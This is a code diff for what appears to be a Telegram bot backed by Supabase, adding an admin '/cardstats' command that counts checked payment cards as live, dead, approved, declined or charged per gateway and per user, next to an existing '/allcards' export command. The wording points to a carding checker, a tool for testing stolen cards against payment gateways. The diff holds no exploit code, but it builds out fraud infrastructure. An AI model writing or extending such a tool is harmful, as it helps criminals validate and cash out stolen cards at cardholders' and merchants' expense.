@@ -5290,8 +5290,81 @@ ${profile.is_banned && profile.ban_reason ? `• Reason: ${profile.ban_reason}` 
     }
 
     // ─────────────────────────────────────────────────────────
-    // CARD EXPORT COMMANDS (Admin Only)
+    // CARD STATS & EXPORT COMMANDS (Admin Only)
     // ─────────────────────────────────────────────────────────
+
+    // /cardstats - Show real-time card statistics from all users
+    if (text === "/cardstats") {
+      const isAdmin = await isAdminAsync(chatId, supabase);
+      if (!isAdmin) {
+        await sendTelegramMessage(chatId, "❌ <b>Access Denied</b>\n\nOnly admins can use this command.");
+        return new Response(JSON.stringify({ ok: true }), { headers: { ...corsHeaders, "Content-Type": "application/json" } });
+      }
+
+      // Fetch real-time stats from all users
+      const { data: allCards, count: totalCount } = await supabase
+        .from("card_checks")
+        .select("result, gateway, created_at, user_id", { count: "exact" });
+
+      if (!allCards || allCards.length === 0) {
+        await sendTelegramMessage(chatId, "📊 <b>Card Statistics</b>\n\n❌ No card records found in the database.");
+        return new Response(JSON.stringify({ ok: true }), { headers: { ...corsHeaders, "Content-Type": "application/json" } });
+      }
+
+      // Calculate stats
+      const liveCount = allCards.filter((c: any) => c.result?.toLowerCase().includes('live') || c.result?.toLowerCase().includes('approved')).length;
+      const deadCount = allCards.filter((c: any) => c.result?.toLowerCase().includes('dead') || c.result?.toLowerCase().includes('declined')).length;
+      const chargedCount = allCards.filter((c: any) => c.result?.toLowerCase().includes('charged')).length;
+      const unknownCount = (totalCount || allCards.length) - liveCount - deadCount;
+      const uniqueUsers = new Set(allCards.map((c: any) => c.user_id)).size;
+
+      // Today's stats
+      const today = new Date();
+      today.setHours(0, 0, 0, 0);
+      const todayCards = allCards.filter((c: any) => new Date(c.created_at) >= today);
+      const todayLive = todayCards.filter((c: any) => c.result?.toLowerCase().includes('live') || c.result?.toLowerCase().includes('approved')).length;
+      const todayDead = todayCards.filter((c: any) => c.result?.toLowerCase().includes('dead') || c.result?.toLowerCase().includes('declined')).length;
+      const todayCharged = todayCards.filter((c: any) => c.result?.toLowerCase().includes('charged')).length;
+
+      // Gateway breakdown
+      const gateways: Record<string, number> = {};
+      allCards.forEach((c: any) => {
+        const gw = c.gateway || 'Unknown';
+        gateways[gw] = (gateways[gw] || 0) + 1;
+      });
+      const gatewayStats = Object.entries(gateways)
+        .sort((a, b) => b[1] - a[1])
+        .slice(0, 5)
+        .map(([name, count]) => `  • ${name}: ${count.toLocaleString()}`)
+        .join("\n");
+
+      const successRate = liveCount > 0 ? ((liveCount / (liveCount + deadCount)) * 100).toFixed(1) : "0.0";
+
+      const message = `📊 <b>Real-Time Card Statistics</b>
+
+<b>━━━ All Time ━━━</b>
+📋 Total Cards: <b>${(totalCount || allCards.length).toLocaleString()}</b>
+✅ Live: <b>${liveCount.toLocaleString()}</b>
+❌ Dead: <b>${deadCount.toLocaleString()}</b>
+💳 Charged: <b>${chargedCount.toLocaleString()}</b>
+❓ Unknown: <b>${unknownCount.toLocaleString()}</b>
+📈 Success Rate: <b>${successRate}%</b>
+👥 Unique Users: <b>${uniqueUsers.toLocaleString()}</b>
+
+<b>━━━ Today ━━━</b>
+📋 Total: <b>${todayCards.length.toLocaleString()}</b>
+✅ Live: <b>${todayLive.toLocaleString()}</b>
+❌ Dead: <b>${todayDead.toLocaleString()}</b>
+💳 Charged: <b>${todayCharged.toLocaleString()}</b>
+
+<b>━━━ Top Gateways ━━━</b>
+${gatewayStats || "  No gateway data"}
+
+<i>🔄 Data fetched in real-time</i>`;
+
+      await sendTelegramMessage(chatId, message);
+      return new Response(JSON.stringify({ ok: true }), { headers: { ...corsHeaders, "Content-Type": "application/json" } });
+    }
 
     // /allcards - Export all checked cards
     if (text === "/allcards") {
